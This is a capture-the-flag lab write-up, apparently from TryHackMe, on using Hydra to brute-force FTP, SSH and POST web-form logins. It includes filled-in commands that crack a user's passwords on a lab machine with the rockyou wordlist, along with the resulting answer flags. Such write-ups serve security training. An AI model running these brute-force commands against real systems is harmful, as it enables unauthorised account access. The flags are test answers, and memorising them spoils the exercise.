# Task 2  Using Hydra
Deploy the machine attached to this task, then navigate to http://MACHINE_IP (this machine can take up to 3 minutes to boot)

## Hydra Commands
The options we pass into Hydra depends on which service (protocol) we're attacking. For example if we wanted to bruteforce FTP with the username being user and a password list being passlist.txt, we'd use the following command:

```shell
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

For the purpose of this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).

### SSH

```shell
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```

### Post Web Form
We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used. You can use your browsers network tab (in developer tools) to see the request types, or simply view the source code.

Below is an example Hydra command to brute force a POST login form:

```shell
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

You should now have enough information to put this to practise and brute-force yourself credentials to the deployed machine!

### Answer the questions below

#Use Hydra to bruteforce molly's web password. What is flag 1?

```shell
hydra -l molly -P ~/Documents/Tools/rockyou.txt 10.10.53.223 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V | tee hydra-web.log
```

> THM{2673a7dd116de68e85c48ec0b1f2612e}

#Use Hydra to bruteforce molly's SSH password. What is flag 2?

```shell
hydra -l molly -P /home/ulli/Documents/Tools/rockyou.txt 10.10.53.223 -t 4 ssh | tee ssh-hydra.log
```

> THM{c8eeb0468febbadea859baeb33b2541b}


